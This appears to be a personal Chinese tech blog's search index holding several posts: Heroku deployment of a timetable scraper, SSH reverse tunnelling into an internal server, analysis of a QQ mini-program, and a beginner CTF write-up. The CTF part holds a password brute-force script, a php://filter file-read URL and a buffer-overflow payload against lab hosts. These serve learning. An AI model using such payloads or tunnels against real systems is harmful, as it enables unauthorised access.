Free版本的话，未认证用户每个月550小时免费动态时长，认证用户（好像是绑定银行卡）1000小时；30分钟无访问无活动的话会自己睡大觉，不会占用你的宝贵时长；提供二级域名，还可以自己绑米。 对于nuaaical来说，这个完全够用了呢！ 那就干脆折腾一下好了。 NUAA iCal Web端搭建需要一个wsgi接口之类的嘛，flask、django这些现成的就行。 本来就啥也不知道也没玩过，看来一下flask挺简单的，于是就简单学了一下flask框架。 然而真正搭建的过程中遇到了一堆奇妙的bug，本地跑着好好的，上了heroku就炸了。（这个不细说了 实际上代码就是从本地版本改的，毕竟在开发的时候留了很多现成的接口了，改一改调用一下函数之类的就完事了。 不过这个验证码折腾了老半天。 这里的策略是，当你访问页面的同时，后端去访问教务系统，把验证码图片爬下来送给前端，同时建立了一个与你有关的session。 当你post用户名密码及验证码后，后端利用同一个session去访问教务系统，进而爬取课表及考试信息，生成icalendar日历文件，而后以附件下载的形式构造response，从而得到属于你的ical课表。 当然，一定程度上安全一点，这个session在构造完response之后就销毁了，不保留在云平台上。 （这样其实还是没搞清楚验证码的机理，一定程度上相当于绕过了而已。 其实到这的话，本地搭建就结束了。 不过还考虑了一下复杂的生产环境…… 比如说登录信息重复post，而原来的验证码就不再有效了。 这里其实想了几种方案，但是行不通。最后干脆折腾了一波HTML，加了个前端界面，如果没登陆成功就提示一下，然后过一会儿返回主页好了。233 （有更好的方案欢迎提出喵！ 比如未登录情况下直接访问导出ical的页面 这个也是直接返回主页了。不过这里这个判断折腾了老半天。 最后的方案是在flask的session里建立了一个属于当前session的bool变量，默认为False，登录以后设置为True。 之前直接写在程序的全局变量里，本地跑着好好的，上云平台就炸了……再见。 还写过在flask的g变量里，后来仔细查了资料，g变量好像是只在当前页面请求中有效，意思就是作用范围不一样，于是否决了。 教务系统连接已重置 这个是他教务系统的问题啊，难顶了。还是折腾了老半天才发现这里的问题。 又改了改登录的延时，这回变成随机延时了，而且时间也加长了。 而且还把爬虫的UA改成了当前浏览器的UA。IP的话好像没办法了。 问题有所改善…然而偶尔还存在。 大不了多试几次就好了。 etc. 其实还有个打算是做个前端ifram框架之类的直接嵌套官方的登录界面，然后登录成功后再利用登录信息来爬取课表，这样一定程度上可能还更安全一点。再说吧…… Heroku搭建下面来简单记录一下Heroku的部署。 注册一个账号 网址https://www.heroku.com/ 略。建议用gmail，不过也看到用国内邮箱也成功的。 安装Heroku CLI 命令行接口 Win-x64：下载地址 其他环境的见官网好了。https://devcenter.heroku.com/articles/heroku-cli 安装完之后就可以在命令行用heroku命令了。 登录 heroku login 会弹出网页登录验证，或者在命令行登录。 准备好app 你看他支持的语言挺多的呢。 我这里用到的就是python啦。 这个在上一节已经搭建好了喵。 创建app heroku create 这时候同时建立了一个名为heroku的git remote仓库，连接到了你本地的git仓库。 当然也可以现在网站上创建一个应用，再clone heroku git:clone -a nuaaical cd nuaaical 这里前提是建立好了名为nuaaical的应用了。 建立依赖相关的requirements.txt 略。 指定执行的入口 这里算是一个坑吧，折腾了好久才发现。 你必须先在代码目录下建立一个名为Procfile的文件，在里面写上你要他执行的命令。比如执行一个python文件之类的。 在这里用的是gunicorn来建立一个web应用。（flask只用于本地测试使用 web: gunicorn web:app 第二个web是文件名（web.py），app是flask实例化的对象啦。（代码里写的app = Flask(__name__) 指定用构建语言（可略？） heroku buildpacks:set heroku/python 显示指定用python来构建打包（网上有的说不指定会报错？ 部署代码 终于可以部署了呀！直接push好了。 git push heroku master 如果不行的话加上-f强制push（小心一点）。 然后可以看到部署的日志，如果有问题就再看看。 没问题的话，效果类似下面的。 看看你的网站吧 heroku open 然后会调用你的浏览器打开。 或者自己在浏览器访问就好了。 嘻嘻嘻，到这就结束啦~ 拓展当然还有一些常用命令，比如： 查看日志**(debug必备了)** heroku logs --tail 看一下还有多少剩余时长 heroku ps 打开app服务 heroku ps:scale web=1 关闭app服务 heroku ps:scale web=0 etc. 官方文档Getting Started on Heroku看这里 https://devcenter.heroku.com/start 除此以外，Heroku还支持pipeline，还可以授权从GitHub上同步部署，还有容器啥的…… 感觉还是挺不错的呢！ Achievements部署好的web端网址： https://nuaaical.herokuapp.com/ 欢迎来试试呀！ 第一次访问可能会花一些时间，等一等吧。 如果不成功的话刷新一下页面（但不要重复提交登录信息），或重新开一个页面访问。 同时多人访问的话也可能会有问题（没试过），那就再试试吧。（摊手 好了我知道这个页面丑了。现学的HTML，别说了。 其实之前奶冰奶冰奶冰冰做了一个前端的↓ 后面再折腾吧咕咕咕 欢迎来贡献代码呀！ 其实之前还折腾了老半天，尝试了在Azure上部署，也成功了。 需要在VSCode中进行部署，然后在配置里设好启动命令（也可以是一个文件）。 不过现在Azure服务到期了。部署的网站也停止了呢。 截个图纪念一下吧。 （hackathon的时候白嫖的Azure还是挺爽的233 同时，代码开源在GitHub上了。欢迎来点个star，提个PR喵！ https://github.com/miaotony/NUAA_iCal_Web 仅供学习研究，未经允许禁止商用，谢谢。 文章中不免存在问题，欢迎提出。 Reference https://devcenter.heroku.com/ https://www.jianshu.com/p/191248ad2639 浪够了，继续准备考试。（真难顶…… 期末冲冲冲！ 说不定这是今年最后一篇blog了喵。 溜了溜了。","path":"2019/12/29/Tech_NUAAiCalWeb_deploy/"},{"title":"小想法 | 基于VSCode和ssh实现远程编程/炼丹","text":"Cause在内网有一台服务器，能连接外网但由于没有公网 IP 而无法在外网直接访问，之前想要在上面跑程序的时候，就得通过远程桌面进行操作。虽然 Teamviewer 速度还可以，但总感觉有点不太爽…… 很久以前（大概一两个月前）就在逼乎上看到过一篇文章说可以 使用vscode进行远程炼丹 （原文见 Reference #1 噫！我来兴趣了，而且其实早就想试试了，然而之前在忙别的没空折腾 （其实现在也没空），就是前几天在配服务器环境的时候 （麻烦到爆炸，最讨厌配环境了），一想干脆就再折腾一下，弄好远程炼丹（编程）吧。 于是乎就这样连Linux命令都不知道几个的憨憨瞎折腾了一两天的ssh，终于实现了远程炼丹，贼有成就感嘻嘻嘻。 其中遇到了一些奇怪的问题，简单记录一下，也方便我忘了再回来看看吧。 时间有限，VSCode的部分就大概提一下思路，重点是ssh的部分吧…… Guidance for ssh不妨假设如下，记清楚了噢，后面频繁用到的。 computer IP/address info 内网服务器A 172.x.x.x 可以访问外网，但外网不能直接访问A 公网服务器B test.com 可以访问外网，也可被外网访问 能够联网的主机C - 想要在C上对A进行访问 内网服务器A上的设置A设置反向代理到B的 port1 端口 工作原理：1、本地主机和远程主机建立连接；2、远程主机上分配了一个 socket 侦听 port 端口；3、远程端口上有了连接, 该连接就经过安全通道转向本机的端口。 备注：root 登录远程主机才能转发特权端口。 ssh -fCNR &lt;port1&gt;:localhost:22 usr_b@test.com -p 22 -R port1:host:port2 将远程机器的端口映射到本地。port1是公网服务器B的端口，host为本地A的IP，port2是A要映射到公网的端口。usr_b@test.com 用户名@服务器B地址，表示连接到B，以用户usr_b登录。当然test.com也可以是IP地址啦。-f SSH客户端在后台运行-C 允许压缩-g 允许远程主机可远程访问，这里有坑。 （但autossh没有这个选项所以应该影响不大）-N Do not execute a shell or command. 不执行脚本或命令，通常与-f连用。-p 22 表示指定连接到B的22端口，默认就是22啦，如果不是的话设置成B的ssh端口。 注意一下，（网上说） 这里有个坑，-g还需要在公网服务器B做下面的设置，设置完后再重启服务。 vim /etc/ssh/sshd_config # 新增 GatewayPorts yes 进阶1 autossh由于ssh会自动断开连接，于是利用自动重连工具autossh，保证连接稳定。 首先安装autossh，这里我用的是CentOS系统。其他类似的。 sudo yum -y install autossh 其实我发现yum（的源里）找不到autossh，后来是用wget下载然后手动安装的… screen -S reverse_proxy autossh -M &lt;port2&gt; -CNR &lt;port1&gt;:localhost:22 usr_b@test.com 多了个-M参数，表示从B的port2检测是否断线。同时autossh会在后台运行，-f也不需要了。 这里的screen用于命令行终端切换，给这个界面起了个名叫reverse_proxy，当然没有装screen的话也需要装一下，不过不执行screen这条语句理论上也能用。 注意，port1和port2均需要在B的安全组内设好规则，允许外网访问。 而后看一下有没有运行↓ 可见A已和B建立连接。此处port1为9999，port2为9998，仅用于演示，你完全可以看心情选择你喜欢的端口，当然有的端口有特定功能另外说。 进阶2 开机自启当然，为了连接再可靠一点，确保A重启后还可以连上，可以在A上再设置一下开机自动启动autossh。 有一种方法是在/etc/rc.local里面添加如下内容 su - user_a -c \"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2&gt; -CNR &lt;port1&gt;:localhost:22 usr_b@test.com\" 其中，-i后接的是SSH_KEY_FILE_PATH，即私钥地址，root用户默认为/root/.ssh/id_rsa。user_a是A上的用户，且要求在公网服务器B上，已经有了A主机上用户user_a的公钥 （这个在下面B的设置中介绍）。 然后记得给这个文件赋予可执行权限。 chmod +x /etc/rc.d/rc.local 不过看这个文件注释里的说法，好像这个方法不推荐了。 当然还可以使用其他的配置开机自启的方法，我也刚折腾对Linux也不熟，后面再看看吧。 现在你可以reboot试一下了，前提是你能确保用这台服务器的其他人没意见，重要数据记得保存好噢。 这样A上的设置就告一段落了，下面看公网服务器B。 公网服务器B上的设置如果只需要在B上对A进行远程炼丹，那就不需要在B上设置啥了，现在直接ssh就完事了。 ssh -p &lt;port1&gt; localhost 因为已经把A的ssh对应的22端口映射到B的port1端口了呀！ 试一下果然如此。 进阶 免密登录这样每次登录都需要输入密码，是有点麻烦了。 这有个办法，就是把本机的ssh公钥复制到要登录的服务器A的~/.ssh/authorized_key文件中，实现免密登录。 什么，你还觉得太麻烦了？？？ 这里还有一个快办法，就是在B上登录A后执行这个—— ssh-copy-id -i .ssh/id_rsa.pub usr_a@172.x.x.x -i 指向本地的公钥文件，一般在用户的目录下。usr_a 为A上要登录的用户名 然后就可以从B免密登录内网服务器A啦。你现在可以在B上ssh试一下，理论上直接就已经登录好了呢！ 在任意一台联网主机C对A进行访问的实现到这里我有点成就感了，远程炼丹实际上已经实现了。 然而我的初衷是要在一台能联网的主机C上去连接内网A的呀，不行还得再折腾一下啊呜。 首先试了一下直接连接公网服务器B的port1，然而不可行。 不过网上有些资料说是可行的，这个我也不知道呢，可能要问神奇的海螺吧。 根据网上的说法，已经在B上对GatewayPorts进行了设置，也杀死进程重启了服务甚至直接reboot了，然而不知道为啥不可行…… 不过也不是没有办法呢，ssh里还有个正向代理闲着没事干呢，说上就上吧。 在B上继续进行如下配置 ssh -fCNL *:&lt;port3&gt;:localhost:&lt;port1&gt; localhost 表示将B上的port1映射到port3，注意port3也要设置安全组规则啊。 用ss -ant 看了一下，port3的确打开了。 理论上这样的话在C上ssh连接B的port3端口，就可以直接访问到内网A了的。 如果你成功了，那就可以直接跳到配置VSCode的部分了，尽情享受远程炼丹的快感吧！ 喜欢的话可以滑到页面下方，赞赏一下给我买点好吃的（我饿了.jpg 然而我并没有成功…… 看了一下安全组设置，没问题，唉，大不了全开了嘛。还是不行。 这里我难受死了，杀死进程又重来试了好几次，一样没有效果。 再去网上查了查，直到看到一篇文章里提到了这个问题，但他直接用的ssh而没有用到autossh，用他的方案还是没解决问题。不过里面提到了一个命令叫lsof，即“列出打开文件(lists openfiles)”，而在Unix中一切（包括网络套接口）都是文件。这可是个神器啊！ 这里用到的是 使用-i :port来显示与指定端口相关的网络信息。 lsof -i :&lt;port3&gt; # 查看连接port3端口的网络信息 结果类似于这样（忘记截图了），此处port3为仅供演示所用的9988。 # lsof -i :9988 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ssh 658 root 4u IPv6 146251 0t0 TCP *:9988 (LISTEN) 这里我才发现，噫，怎么只监听了IPv6，而没有IPv4啊！ 实际上通过ss -ant也可以发现对应的端口只有tcp6而没有tcp… 然而阿里云实例（安全组内）只有IPv4出口来着，而且也是通过IPv4连接到B的，怪不得连不上呢。（佛了 不过也奇怪了，理论上ssh应该v4和v6都监听的吧。 去查了一下ssh命令，这次强制使用 IPv4试试。 （在B上杀死之前的ssh，再执行下面的命令。记得改成你的端口哈。 ssh -fCNL *:&lt;port3&gt;:localhost:&lt;port1&gt; localhost -4 -4表示强制使用IPv4 这回再看lsof -i :&lt;port3&gt;： # lsof -i :9988 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ssh 954 root 4u IPv4 255331 0t0 TCP *:9988 (LISTEN) 然后再在C上连接B的port3端口。 哇哇哇成功了！ 看来果然是这个问题啊我哭了又笑了。 下面就可以设置VSCode来实现远程炼丹啦！ Guidance for VSCode具体可以参考Reference #1，这里简单操作一下。 在VSCode安装**Remote Development开发包（扩展）**，然后在远程资源管理器里新增一个SSH Target。 在用户的.ssh/config文件内新增你的内网炼丹炉信息。 Host 给你的内网主机起个名（看你心情随意取）HostName 公网服务器B的IP或域名Port 填port3，如果port1能连上就填port1User 填内网服务器A的登录用户名 保存，然后便可以连接试一试了。 连接后输入A对应用户的密码，然后就连上了。打开文件夹还需要再输一次密码。 现在再用前面在B的配置里说的办法，把C主机的公钥放到A里就可以实现免密登录啦！ 呐，这就是在C上连接到内网炼丹炉的效果了↓。 网络延时几乎没有（不过也取决于网络环境），和在本地编程几乎没有差别，爽到爆炸！ 哇哇哇成就感爆棚啊哇哇哇！！！ Summary时间因素，不可避免可能存在一些失误之处，其中也有不少可以拓展之处，欢迎交流提出哈。 本文仅用于学习研究，请在合理合法范围内使用， 未经允许不得商用，转载请署名MiaoTony并保留本文链接，谢谢。 说点题外话吧。 上周末到这周部署NUAA_iCal_Web在线版本弄了一周末（好菜啊第一次弄部署来着…），配服务器环境折腾了老半天（甚至只装好了GPU驱动和anaconda还没配CUDA），配远程炼丹又瞎折腾了一两天，写这篇文章又断断续续地花了好几个小时。 呜下周开始频繁考试了，不敢瞎折腾了嘤嘤嘤。（溜了溜了 Reference 使用vscode进行远程炼丹 SSH反向连接使用Autossh自动ssh 利用阿里云ECS跳板机内网穿透- ssh SSH如何反向代理稳定穿透内网 内网穿透：在公网访问你家的 NAS （还包括frp相关） 从外网 SSH 进局域网，反向代理+正向代理 autossh 穿透，反向代理到内网 ssh-copy-id三步实现SSH无密码登录和ssh常用命令 Linux 命令神器：lsof 使用 autossh 自动重启 SSH 会话和通道 CentOS7添加开机启动服务或脚本 etc. 非常感谢上面这些文章，给了我很多启发呢。","path":"2019/12/21/Idea_RemoteProgramming/"},{"title":"小想法 | QQ小程序【年终报告单/2019年终总结】分析","text":"缘由这两天看空间各种发【我的2019年终报告】，然后我也去测了一下，没想到啥也不用填，申请获取个人信息的权限，报告就出来了。 然而弹出一个遮罩层让你先看个15s的广告…… 超想吐槽，包括页面下面的广告。。 然后看完广告，终于出来了。 正当我截了图返回之后，噫换个性别试试。 好，这回不一样了呀！ 然后再来一次，噫，又不一样了……这让我怀疑他就是假的几张图片而已吧。 我兴趣来了，不如来折腾一下，分析一下这个小程序吧。 （不折腾会死…… 开始折腾 1先来看一看这个小程序的设置，发现只获取了用户信息。看一眼更多资料—— 先确定了这是个个人开发的小程序，看相关的域名除了Tencent家的，主要就是wxa.game-a1.cn 和free-api.heweather.com。 查了一下，后者是一个查天气的API（需要的话可以用一波）（就是很迷惑为啥这里会有这个 前者是一个个人的域名吧，看样子是用的一个开发小程序的平台。根域名还是个博客，里面还有搭建微信小程序的经历。 2ping了一下这个域名，得到IP：47.105.42.112 然后抓了个包，过滤只看关于这个IP的数据包。发现有两个。 前面一个不懂什么鬼填了个表，估计收集了一波使用数据，先不管。重点是后面这个。 很明显是访问了http://wxa.game-a1.cn/wxa/qqnz2019/index.php这个网址。 3浏览器启动，F12大法好呀。 好一个JSON字符串，来分析一下吧。 qrcode很明显是二维码啦，下载下来解码发现调用了qq小程序的接口吧，访问会跳转到这个小程序。 url和url1都是一样的，指向了一个阿里云的对象存储。↓ https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png 多次刷新发现好像的确就那几张图片，改变了一下x.png而已。 而且的确这就是假的图啦。（不然哪来的用户数据可以分析 4既然都知道是几张图片而已了，那顺便就爬下来吧。 PyCharm 启动，来写一写jio本。 写range是因为随便试了一下，本来就没有几张图片而已，然而懒得手动下载。 看结果的确就7张图片。。 呐就这几张了↓ 5看样子小程序获取个人头像，然后再和二维码、上面的任意一张图拼接在一起而已吧。 就是这个form.php，看样子是用来统计使用数据的吧emmm问题不大。 小结哇呜折腾了一个中午好气啊，（有毒 不折腾会死 不管怎么说这个小程序还是有点意思的，至少做的那几张图片还挺不错的哈哈哈。 不过要吐槽这个广告超级讨厌emmm 就这样吧。 爬取图片的源码 和 爬到的图片放到了Github上了，有需要的可以去看看吧。 URL：这是网址 https://github.com/miaotony/Scrapy_2019Year-end_Report","path":"2019/12/04/Scrapy_2019Year-end_Report/"},{"title":"CTF | Asuri战队 2019招新赛 WriteUP","text":"Asuri 招新赛WriteUP 20191117网址： http://139.9.212.218:8000/challenges 官方安排及WriteUP：https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp testflag{this_is_test_flag} misc-签到 base64解码即得到 flag{1_want_jiamus_p0wer} baby-web-九曲十八弯 http://desperadoccy.club:39011/ base64解码 Asuri{view_source's_power} 快速计算 http://47.102.107.100:39012/ 连续20次在1-2s内判断是否正确，即可得到flag。 import requests import re import time s = requests.Session() r = s.get(\"http://47.102.107.100:39012/\") for i in range(20): time.sleep(1) equation = re.findall(r'&lt;div&gt;(.*)=(.*)&lt;/div&gt;', r.text)[0] print(equation) answer = eval(equation[0]) if answer == eval(equation[1]): values = {'answer': 'true'} else: values = {'answer': 'false'} r = s.post(\"http://47.102.107.100:39012/\", data=values) r.encoding = 'utf-8' print(r.text) Asuri{python_1s_th3_be3t_l4ngu4ge} medium_web_justburp http://139.9.212.218:39010/ 查找网站目录下的文件 访问robots.txt 得到： 访问hint.php 得到一个文件 尝试以admin作为用户名，用以上信息作为密码写脚本进行登录， 然而好像没有成功（有可能有成功的没看到？？？ 难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…加一个if重新来就看到了惹emmm 爆破一波 # -*- coding:utf-8 -*- import requests s = requests.Session() r = s.get(\"http://139.9.212.218:39010/index.php\") r.encoding = \"utf-8\" print(r.text) with open('name-pass.txt', 'r') as file: contents = file.read().split() # print(contents) passwords = contents for password in passwords: values = {'name': 'admin', 'password': password} r = s.get(\"http://139.9.212.218:39010/index.php\", params=values) r.encoding = 'utf-8' if '密码错误' not in r.text: print(r.text) 即可得到 &lt;!DOCTYPE html&gt; &lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;Hi hacker&lt;/title&gt; &lt;/head&gt; &lt;body bgcolor=\"bisque\"&gt; &lt;form action=\"index.php\" method=\"get\"&gt;用户名：&lt;br&gt;&lt;input type=\"text\" name=\"name\"&gt;&lt;br&gt;密码：&lt;br&gt;&lt;input type=\"text\" name=\"password\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"登陆\"&gt; &lt;/form&gt; &lt;p&gt;hint:admin用户的密码似乎在某个页面里 &lt;/p&gt; &lt;p&gt; 看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; flag: Asuri{Burp_1s_Gre@t} 其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。然而我现场还在搜它怎么用…… hard_web_php是世界上最好的语言 http://139.9.212.218:39009/ 改cookie重发 访问read_file.php，得到 访问no_flag_here.php ，构造参数进入根目录 然而！emmm这个scandir怎么获取这个flag文件内容啊！！！ 看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 构造file=php://filter/read=convert.base64-encode/resource=+绝对路径 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php 或者 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php 得到一串Base64字符串 PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg== 解码后： &lt;?php //Asuri{WEB_WINNER} ?&gt; flag: Asuri{WEB_WINNER} easy_pwn from pwn import * # 引入pwntools库 import time sh = remote('49.235.243.206', 9001) # 创建与靶场服务器的连接 offset = 0x60+0x8 # 偏移 system_addr = 0x400766 # system函数地址 for i in range(4, 20): sh.recvuntil('Please input your passworld size') sh.sendline(p64(i)) # 向程序发送数据 sh.recvuntil('Please input your password') payload = offset * b'a' + p64(system_addr) # 构造攻击数据 sh.sendline(payload) # 向程序发送数据 sh.interactive() # 将控制流从程序转移到自己这里 完了不会写，嘤嘤嘤 medium_rev#!/usr/bin/env python # encoding: utf-8 # 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc def encrypt_for_each(): index = [ 0] * 100 for i in range(100): tmp = i ^ 77 yield tmp None def encrypt(msg, key): iters = encrypt_for_each() enc = [] for (m, k) in zip(msg, key): e = m ^ k ^ iters.__next__() enc.append(e) return enc def generate_key(): def check_prime(num): if num &lt; 2: return False for i in range(2, num): if num % i == 0: return False return True test = [ 8, 61, 85, 25, 121, 53, 26, 0, 81, 52, 124, 22, 137, 56, 94, 107, 59, 132, 90, 3, 51, 46, 77, 127, 35, 86, 134, 20, 73, 32, 66, 99, 7, 69, 122, 4, 142, 23, 80, 109, 60, 79, 36, 62, 5, 104, 102, 14, 58, 149, 31, 96, 68, 114, 116, 11, 95, 87, 146, 123, 15, 135, 33, 37, 110, 19, 106, 30, 130, 101, 97, 98, 141, 2, 47, 6, 24, 131, 16, 111, 150, 55, 1, 76, 12, 138, 64, 120, 118, 29, 145, 147, 9, 113, 103, 40, 92, 71, 72, 129, 139, 100, 63, 133, 42, 125, 74, 88, 143, 144, 38, 140, 67, 119, 136, 115, 54, 21, 50, 108, 128, 57, 112, 43, 84, 70, 78, 28, 41, 93, 44, 13, 18, 10, 48, 27, 83, 65, 17, 75, 126, 39, 49, 91, 34, 82, 45, 148, 105, 89, 117] key = (lambda .0: continue[ i for i in .0 ])(filter(check_prime, test)) return key if __name__ == '__main__': key = generate_key() msg = [ 22, 21, 167, 66, 9, 27, 3, 119, 42, 99, 68, 86, 13, 166, 3, 120, 22, 59, 9, 77, 40, 3, 233, 41, 67, 108, 80, 179, 86, 36, 31, 107, 77, 4, 75] print('encryt message is {}'.format(msg)) lambda .0: continue[ i for i in .0 ] 这个.0执行不了啊emmm 我换成x也报错唉！ middle_pwn 小结 第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233 除了石榴园的真的没多少打这个比赛的呀。 我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤 现场查BurpSuite怎么用也是绝了（那节培训我没去emmm 总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ 等我有空再折腾一下，搭个博客吧 咕咕咕 20191128 更新：我来折腾了，嘻嘻嘻！","path":"2019/11/28/CTF_2019Asuri_Recruitment/"},{"title":"test","text":"测试一下再来一下哈~ 喵~~嘿嘿嘿","path":"2019/11/28/test/"},{"title":"typora_tips 一些关于typora的快捷键","text":"[TOC] ​ 随便练练typora，参考了一些网上的资料，顺便记录一下，方便后面查阅哈~ 标题ctrl + 数字键 最多支持到六级标题 一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 取消标题​ ctrl + 数字0 标题取消标题 加粗ctrl + B 这是加粗 倾斜ctrl + I 这是倾斜 下划线ctrl + U 这是下划线 删除线alt + shift + 5 这是删除线 无序列表 - + space + enter miao miaomiao! 嵌套 再来嵌套 上一个层次 喵！ 有序列表数字键. + space + enter 第一个 第二个 嵌套一下 再来一下 再嵌套一个 继续 继续来 就这样吧 任务列表- [] TODO - [x]已完成 这是待完成的 这个已完成了 引用&gt; + space + enter 或者 ctrl + shift + Q 这就是引用 这也是 ​ 还可以嵌套引用 ​ 再来一个 这也行 一样的 插入图片ctrl + shift + I 网上说用MPic做图床挺不错的。（还没试过 直接拖进来也行 插入链接ctrl + K 这是链接，跳转到我的博客哈 插入表格ctrl + T mm text 测试 再测试 123 456 插入代码单行代码（文中的代码）ctrl + shift + ` `输入代码` 多行代码（代码块）ctrl + shift + K ``` 输入代码 ``` print(\"Hello world!\\n\") # Python printf(\"Hello, this is C.\") // C disp(\"Hello, this is MATLAB.\") % MATLAB print(\"Hello, this is lua.\") -- lua 插入表情:名称: (英文状态下) 🐱 🐶 PS：微软输入法可以用ctrl + shift + B弹出表情窗口。 😀👌 插入分割线--- 下面是分割线 插入高亮显示==中间写文字== ==这是高亮== 插入脚注文字[^脚注] 示例^1 插入公式ctrl + shift + M 或者 行内公式（内联公式）： $公式$ 行间公式： $$ 公式 $$ $$\\lim_{x\\to +\\infty} \\frac{1}{x}=0$$加个框试试（\\boxed{}）：$$\\boxed{ \\overrightarrow{AB}}$$ 这是行内公式 $ \\sqrt[3]{test} $ ，妙啊~ 具体的还得慢慢看呢。 顺便学一波LaTex也挺不错的~ 插入目录[toc] + ENTER 就是最上面那个啦~ 新建文件ctrl + N 选中中文/英文ctrl + D miao miao~ ctrl + Shift + 左/右 快速选中整个词语/单词。 选中整行ctrl + L 查找ctrl + F 替换ctrl + H 跳转到开头/结尾ctrl + HOME 跳转至文章开头 ctrl + END 跳转至文章末尾 打开文件（笔记）ctrl + P 全屏显示F11 侧边栏ctrl + shift + L 清除格式ctrl + \\ 切换到代码模式ctrl + / ==etc.== 还有挺多还要慢慢去发掘呢~ 顺便说一下 Snipaste 这个截图工具挺强大的 官网 https://zh.snipaste.com/ 本文搬运自我的csdn博客啦~","path":"2019/08/29/typora_tips/"},{"title":"小想法 | 开源一个自己的Python小项目「Park at ease」停车场管理系统","text":"Park at ease停车场管理系统基于Python实现 Park Management SystemBased on Python… print('Hello, this is Park_at_ease!') 一些说明这个项目本来是给部门里小干事布置的《2019寒假进阶指南》里 Section2 的课设任务（题目基本上是根据自己的想法出的），当时自己正好在学Python，就想拿这个项目练练手，于是就有了这个基于Python面向对象实现的停车场管理系统。 原来这个项目都是自己弄着玩的，这几天整理文件发现几个月前还写了这玩意儿，还挺有意思的。这个项目其实还有很多可以开发的空间的，于是就想着把它开源了吧，希望大家可以一起来完善呢！ PS:原则上不提供技术支持哈。 项目网站（基于Github Pages搭建）：来点我哈 或 https://miaotony.github.io/Park_at_ease/ GitHub项目网址：来点我鸭 或 https://github.com/miaotony/Park_at_ease 欢迎大家在此基础上继续完善鸭~欢迎Star、Fork、提PR &amp; issue！ 使用及转载时请注明出处，保留作者信息，严禁商用，严禁用于完成课设任务，谢谢！ Overview 这是编者参考了一小部分网络上相关的题目，结合实际生活，融合了自己一些想到的，给小干事们出的题目。这里直接就截屏放出来吧，PDF还有别的内容懒得改了。如果有什么建议欢迎在GitHub上提issue或者在这里评论哈~！ TODO 管理员界面 Administrator Interface 文件操作 FileIO 登录界面 Login 登录加密 Login Encryption 图形界面 GUI 多线程或多进程 Multithreading or Multiprocessing 邮件推送 Email Push 微信推送 WeChat Push TCP 嵌入式开发 Embedded Development etc. 具体请移步到GitHub鸭！ 项目网站（基于Github Pages搭建）：来点我哈 或 https://miaotony.github.io/Park_at_ease/ GitHub项目网址：来点我鸭 或 https://github.com/miaotony/Park_at_ease 溜了溜了下次再见啦~ 搬运自我的csdn博客啦~","path":"2019/08/18/Park_at_ease/"},{"title":"小想法 | 基于模拟点击实现数据自动测量","text":"搬运一篇之前写的小想法啦~ 起因人工智能——先人工后智能哪里有现成数据给你还不是人工手动去测…… 大创要测数据emmm，简单来说就是点点按钮，等它数据测量完成，然后按照命名规范保存。就是这个也太枯燥了8，效率还低。不如py一下写个自动执行的！说写就写呗（斜眼笑.gif) 初代版本发现Python有个现成的第三方库叫PyAutoGui库，它给的函数还是挺方便的。按照测数据操作的流程用代码还原一遍，测试发现速度太快了电脑吃不消，于是乎到处加延时233。 总之还是挺不错的吧输入角度、次数、开始index（程序崩的时候备用），然后就可以自动开始测量，新建文件夹，按顺序命名保存。 理论一天可测的数据量从270组提高到435组，效率提升了61%吧！ 还要感谢潇潇弟弟陪我debug 嘻嘻嘻~ 升级版 Update on 20190725. 之前写的自动测数据的程序还有点小问题，今天又更新了两个版本。。 由于测量软件的问题，每组都会漏一些数据，所以还要手动补测。 于是乎今天加了个文件是否存在的判断，确定保存成功之后才继续下一组测量，这样就不用补测了！ 另外还加入了log，记录日志文件方便检查错误。 嘿嘿嘿~","path":"2019/07/10/Idea_AutoMeasure/"},{"title":"第一篇 随便写写","text":"搬运自我的CSDN博客 这篇可以算是第一次公开发出来的吧（其实严格来说也不算啦，只是之前发的年份过久估计都404或者找不到了233 print(\"Hello, everyone!\") Why? 上了大学之后，做大作业、写论文、写报告、做项目、参加各种比赛，经常需要各种找资料，大多是EE和CS方向的。 这时候经常就逛到CSDN、博客园、简书、逼乎之类的这些，或者大佬们自己搭建的博客，当然还有B站这样有着各种学习视频的好地方。 大家都乐于把自己的体会和经验分享出来，对于我这样的菜鸡来说帮助很大鸭。比如说码着码着代码遇到啥bug了，然后上来一查，很多时候别人也遇到过，于是乎什么情况下遇到的、如何解决的大都有了，很方便就能解决问题呢。 其实本来就觉得写点东西挺有意思的，特别是看到身边的小伙伴在CSDN上也开了自己的账号，开始分享自己的一些 debug 经历以及生活常事，越发觉得挺有意思的也挺有意义的。于是我也来写一写呗。 登录的时候突然才发现，CSDN上我的账号原来7年前就注册了，估计之前还只是随便逛逛以及下载些资料，都没有在这儿写过啥东西233。没事问题不大哈哈哈。 When?其实之前有啥小想法或者小制作，都是随便写两句话讲讲到空间……当然，有想法 &amp;&amp; 有空 的时候，就来这儿写点东西吧！ What?其实我感兴趣的东西挺多的 emmm比如说大体说一说嘛： 嵌入式相关 MCU单片机 FPGA 物联网 IoT ESP8266（准备好好研究一波，可以单独列一列） 编程 Python 以及各种库 MATLAB 人工智能 AI 机器学习 Machine Learning，ML 计算机视觉 Computer Vision，CV 数据分析与挖掘 数据获取（如爬虫虫） 数据可视化 